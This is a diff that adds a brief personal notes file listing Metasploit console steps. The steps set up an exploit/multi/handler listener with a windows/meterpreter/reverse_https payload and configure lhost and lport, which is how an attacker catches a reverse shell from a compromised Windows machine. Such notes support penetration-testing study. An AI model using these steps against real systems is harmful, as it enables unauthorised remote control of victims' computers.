@@ -1,0 +1,10 @@
+metasploit steps:-
+# msfconsole
+# service apache2 start
+
+
+1. use exploit/multi/handler
+2. show options
+3.set payload--> windows/meterpreter/reverse_https
+  set lhost,lport
+
